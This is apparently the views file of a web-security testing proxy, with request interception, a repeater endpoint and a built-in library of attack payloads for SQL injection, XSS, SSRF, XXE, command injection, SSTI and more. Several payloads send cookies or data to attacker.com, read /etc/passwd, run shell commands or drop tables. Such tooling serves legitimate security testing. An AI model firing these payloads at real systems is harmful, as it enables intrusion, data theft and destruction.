from django.shortcuts import render
from rest_framework.decorators import api_view
from rest_framework.response import Response
from .models import InterceptedRequest, InterceptorSettings
from proxy.models import ProxyRequest
import json


# ---------------------------------------------------------------------------
# Vulnerability type catalogue and payload library
# ---------------------------------------------------------------------------

VULNERABILITY_CATEGORIES = [
    {
        'id': 'sqli',
        'name': 'SQL Injection (SQLi)',
        'subcategories': [
            {'id': 'sqli_error', 'name': 'Error-based SQLi'},
            {'id': 'sqli_blind_bool', 'name': 'Blind SQLi (Boolean-based)'},
            {'id': 'sqli_blind_time', 'name': 'Blind SQLi (Time-based)'},
            {'id': 'sqli_union', 'name': 'Union-based SQLi'},
            {'id': 'sqli_oob', 'name': 'Out-of-band SQLi'},
        ],
    },
    {
        'id': 'xss',
        'name': 'Cross-Site Scripting (XSS)',
        'subcategories': [
            {'id': 'xss_reflected', 'name': 'Reflected XSS'},
            {'id': 'xss_stored', 'name': 'Stored XSS'},
            {'id': 'xss_dom', 'name': 'DOM-based XSS'},
        ],
    },
    {
        'id': 'ssrf',
        'name': 'Server-Side Request Forgery (SSRF)',
        'subcategories': [
            {'id': 'ssrf_basic', 'name': 'Basic SSRF'},
            {'id': 'ssrf_blind', 'name': 'Blind SSRF'},
        ],
    },
    {
        'id': 'xxe',
        'name': 'XML External Entity (XXE)',
        'subcategories': [
            {'id': 'xxe_classic', 'name': 'Classic XXE'},
            {'id': 'xxe_blind', 'name': 'Blind XXE'},
        ],
    },
    {
        'id': 'cmdi',
        'name': 'Command Injection',
        'subcategories': [
            {'id': 'cmdi_os', 'name': 'OS Command Injection'},
            {'id': 'cmdi_code', 'name': 'Code Injection'},
        ],
    },
    {
        'id': 'lfi',
        'name': 'Path Traversal / Local File Inclusion (LFI)',
        'subcategories': [
            {'id': 'lfi_traversal', 'name': 'Directory Traversal'},
            {'id': 'lfi_inclusion', 'name': 'File Inclusion'},
        ],
    },
    {'id': 'csrf', 'name': 'Cross-Site Request Forgery (CSRF)', 'subcategories': []},
    {'id': 'ssti', 'name': 'Server-Side Template Injection (SSTI)', 'subcategories': []},
    {'id': 'idor', 'name': 'Insecure Direct Object Reference (IDOR)', 'subcategories': []},
    {
        'id': 'auth_bypass',
        'name': 'Authentication Bypass',
        'subcategories': [
            {'id': 'auth_jwt', 'name': 'JWT Manipulation'},
            {'id': 'auth_session', 'name': 'Session Fixation'},
        ],
    },
    {
        'id': 'header_injection',
        'name': 'Header Injection',
        'subcategories': [
            {'id': 'header_host', 'name': 'Host Header Injection'},
            {'id': 'header_crlf', 'name': 'CRLF Injection'},
        ],
    },
    {'id': 'open_redirect', 'name': 'Open Redirect', 'subcategories': []},
    {'id': 'http_smuggling', 'name': 'HTTP Request Smuggling', 'subcategories': []},
    {'id': 'nosqli', 'name': 'NoSQL Injection', 'subcategories': []},
    {'id': 'ldap_injection', 'name': 'LDAP Injection', 'subcategories': []},
]

# Ready-made payloads keyed by vulnerability id / sub-id
VULNERABILITY_PAYLOADS = {
    'sqli_error': [
        "'", '"', "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "1; DROP TABLE users--",
        "' UNION SELECT NULL--", "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    ],
    'sqli_blind_bool': [
        "' AND 1=1--", "' AND 1=2--", "' AND SUBSTRING(username,1,1)='a'--",
        "1 AND 1=1", "1 AND 1=2",
    ],
    'sqli_blind_time': [
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        "1'; SELECT pg_sleep(5)--",
    ],
    'sqli_union': [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    ],
    'sqli_oob': [
        "'; EXEC master..xp_dirtree '//attacker.com/a'--",
        "' UNION SELECT LOAD_FILE('//attacker.com/test')--",
    ],
    'xss_reflected': [
        '<script>alert(1)</script>', '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>", '<svg onload=alert(1)>',
        'javascript:alert(1)',
    ],
    'xss_stored': [
        '<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>',
        '"><script>fetch("//attacker.com?c="+document.cookie)</script>',
    ],
    'xss_dom': [
        '#<script>alert(1)</script>', '#"><img src=x onerror=alert(1)>',
        'javascript:alert(document.domain)',
    ],
    'ssrf_basic': [
        'http://127.0.0.1/', 'http://localhost/', 'http://169.254.169.254/',
        'http://[::1]/', 'http://0.0.0.0/',
        'http://169.254.169.254/latest/meta-data/',
    ],
    'ssrf_blind': [
        'http://attacker.com/ssrf-probe', 'http://burpcollaborator.net/',
        'http://127.0.0.1:22/', 'http://127.0.0.1:6379/',
    ],
    'xxe_classic': [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ],
    'xxe_blind': [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    ],
    'cmdi_os': [
        '; ls', '; id', '| id', '`id`', '$(id)', '; cat /etc/passwd',
        '&& whoami', '|| whoami',
    ],
    'cmdi_code': [
        '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '__import__("os").system("id")',
    ],
    'lfi_traversal': [
        '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
        '..%2F..%2Fetc%2Fpasswd', '....//....//etc/passwd',
        '..\\..\\..\\windows\\win.ini',
    ],
    'lfi_inclusion': [
        '/etc/passwd', '/etc/shadow', '/proc/self/environ',
        'php://filter/convert.base64-encode/resource=index.php',
        'data://text/plain,<?php system($_GET["cmd"]); ?>',
    ],
    'csrf': [
        '<form action="https://target.com/action" method="POST"><input type="hidden" name="param" value="malicious"><input type="submit"></form>',
    ],
    'ssti': [
        '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7 * 7 %>', '{{config}}',
        '{{"".__class__.__mro__[1].__subclasses__()}}',
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    'idor': [
        '1', '2', '3', '0', '-1', '999999', 'admin', 'test',
    ],
    'auth_jwt': [
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        'none_algorithm_token',
    ],
    'auth_session': [
        'PHPSESSID=attacker_session', 'session=fixated_value',
    ],
    'header_host': [
        'evil.com', 'localhost', '127.0.0.1', 'internal-service',
    ],
    'header_crlf': [
        'value\r\nX-Injected: header', 'value%0d%0aX-Injected: header',
        'value%0aX-Injected: header',
    ],
    'open_redirect': [
        'http://evil.com', '//evil.com', '/\\evil.com', 'javascript:alert(1)',
        'https://evil.com', 'data:text/html,<script>alert(1)</script>',
    ],
    'http_smuggling': [
        'Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n',
    ],
    'nosqli': [
        "{'$gt': ''}", '{"$ne": null}', '{"$regex": ".*"}',
        "' || '1'=='1", "admin' || 'x'=='x",
    ],
    'ldap_injection': [
        '*', '*)(&', '*)(uid=*)', '*(|(mail=*)', '*(|(objectclass=*)',
    ],
}


def _get_payloads_for_vuln_ids(vuln_ids, locations):
    """Return a list of {location, vuln_id, payload} dicts."""
    results = []
    for vid in vuln_ids:
        payloads = VULNERABILITY_PAYLOADS.get(vid, [])
        for p in payloads:
            for loc in locations:
                results.append({
                    'vuln_id': vid,
                    'location': loc,
                    'payload': p,
                })
    return results


# ---------------------------------------------------------------------------
# Existing views
# ---------------------------------------------------------------------------

@api_view(['GET'])
def list_intercepted(request):
    """List all intercepted requests"""
    intercepted = InterceptedRequest.objects.filter(status='pending')[:50]
    data = [{
        'id': req.id,
        'original_method': req.original_method,
        'original_url': req.original_url,
        'status': req.status,
        'timestamp': req.timestamp.isoformat(),
    } for req in intercepted]
    return Response(data)


@api_view(['GET', 'PUT'])
def intercepted_detail(request, request_id):
    """Get or update an intercepted request"""
    try:
        intercepted = InterceptedRequest.objects.get(id=request_id)
        
        if request.method == 'GET':
            data = {
                'id': intercepted.id,
                'original_method': intercepted.original_method,
                'original_url': intercepted.original_url,
                'original_headers': intercepted.original_headers,
                'original_body': intercepted.original_body,
                'modified_method': intercepted.modified_method,
                'modified_url': intercepted.modified_url,
                'modified_headers': intercepted.modified_headers,
                'modified_body': intercepted.modified_body,
                'status': intercepted.status,
            }
            return Response(data)
        
        elif request.method == 'PUT':
            # Update intercepted request
            intercepted.modified_method = request.data.get('method', intercepted.original_method)
            intercepted.modified_url = request.data.get('url', intercepted.original_url)
            intercepted.modified_headers = request.data.get('headers', intercepted.original_headers)
            intercepted.modified_body = request.data.get('body', intercepted.original_body)
            intercepted.status = request.data.get('status', 'modified')
            intercepted.save()
            return Response({'message': 'Request updated successfully'})
            
    except InterceptedRequest.DoesNotExist:
        return Response({'error': 'Request not found'}, status=404)


def interceptor_dashboard(request):
    """Dashboard view for the interceptor"""
    settings = InterceptorSettings.get_settings()
    return render(request, 'interceptor/dashboard.html', {
        'interceptor_enabled': settings.is_enabled
    })


@api_view(['GET', 'POST'])
def interceptor_status(request):
    """Get or set interceptor status"""
    settings = InterceptorSettings.get_settings()
    
    if request.method == 'GET':
        return Response({
            'is_enabled': settings.is_enabled,
            'updated_at': settings.updated_at.isoformat()
        })
    
    elif request.method == 'POST':
        is_enabled = request.data.get('is_enabled', settings.is_enabled)
        
        # Validate boolean type
        if not isinstance(is_enabled, bool):
            return Response({
                'error': 'is_enabled must be a boolean value'
            }, status=400)
        
        settings.is_enabled = is_enabled
        settings.save()
        return Response({
            'success': True,
            'is_enabled': settings.is_enabled,
            'message': f"Interceptor {'enabled' if settings.is_enabled else 'disabled'}"
        })


@api_view(['GET'])
def vulnerability_list(request):
    """Return the full catalogue of supported vulnerability types and their payloads.

    GET /interceptor/api/vulnerability-list/
    """
    return Response({
        'success': True,
        'categories': VULNERABILITY_CATEGORIES,
    })


@api_view(['POST'])
def send_to_repeater(request):
    """Send an intercepted request to the Repeater, optionally with auto-generated payloads.

    POST /interceptor/api/send-to-repeater/

    Request body:
        request_id     (int, required)  – InterceptedRequest primary key
        mode           (str)            – 'manual' or 'automatic' (default: 'manual')
        locations      (list[str])      – Injection points: 'url_params', 'headers', 'body',
                                          'cookies', 'all'  (used when mode='automatic')
        vuln_ids       (list[str])      – Vulnerability sub-category ids to test
                                          (used when mode='automatic')

    Response (201):
        repeater_id    – RepeaterRequest primary key
        repeater_url   – URL to open the repeater with this request pre-selected
        payloads       – Generated test payload list (when mode='automatic')
        message        – Confirmation string
    """
    request_id = request.data.get('request_id')
    if not request_id:
        return Response({'error': 'request_id is required'}, status=400)

    # Retrieve the intercepted request
    try:
        intercepted = InterceptedRequest.objects.get(id=request_id)
    except InterceptedRequest.DoesNotExist:
        return Response({'error': f'Intercepted request {request_id} not found'}, status=404)

    mode = (request.data.get('mode') or 'manual').lower()
    locations_raw = request.data.get('locations', ['body'])
    vuln_ids = request.data.get('vuln_ids', [])

    # Normalize location list
    all_locations = ['url_params', 'headers', 'body', 'cookies']
    if 'all' in locations_raw:
        locations = all_locations
    else:
        locations = [loc for loc in locations_raw if loc in all_locations] or ['body']

    # Pull data from the intercepted request
    method = getattr(intercepted, 'original_method', None) or getattr(intercepted, 'method', 'GET')
    url = getattr(intercepted, 'original_url', None) or getattr(intercepted, 'url', '')
    headers = getattr(intercepted, 'original_headers', None) or getattr(intercepted, 'headers', {})
    body = getattr(intercepted, 'original_body', None) or getattr(intercepted, 'body', '')

    # Serialize headers for the RepeaterRequest model (expects a JSON string)
    if isinstance(headers, dict):
        headers_str = json.dumps(headers)
    elif isinstance(headers, str):
        headers_str = headers
    else:
        headers_str = '{}'

    # Build a descriptive name
    vuln_label = ', '.join(vuln_ids[:3]) if vuln_ids else 'intercepted'
    name = f'[Interceptor/{vuln_label}] {url}'[:255]

    # Import here to avoid circular dependencies
    from repeater.models import RepeaterRequest, RepeaterTab

    # Create a new repeater tab for this interception
    tab = RepeaterTab.objects.create(name=f'Interceptor: {url}'[:255])

    repeater_req = RepeaterRequest.objects.create(
        url=url,
        method=method,
        headers=headers_str,
        body=body or '',
        name=name,
        source='interceptor',
        tab=tab,
    )

    # Generate payloads for automatic mode
    generated_payloads = []
    if mode == 'automatic' and vuln_ids:
        generated_payloads = _get_payloads_for_vuln_ids(vuln_ids, locations)

    repeater_url = f'/repeater/?request_id={repeater_req.id}'

    return Response({
        'success': True,
        'repeater_id': repeater_req.id,
        'repeater_url': repeater_url,
        'mode': mode,
        'locations': locations,
        'payloads': generated_payloads,
        'message': (
            f'Request sent to Repeater (tab "{tab.name}"). '
            f'{len(generated_payloads)} test payload(s) generated.'
            if mode == 'automatic'
            else f'Request sent to Repeater (tab "{tab.name}") for manual editing.'
        ),
    }, status=201)
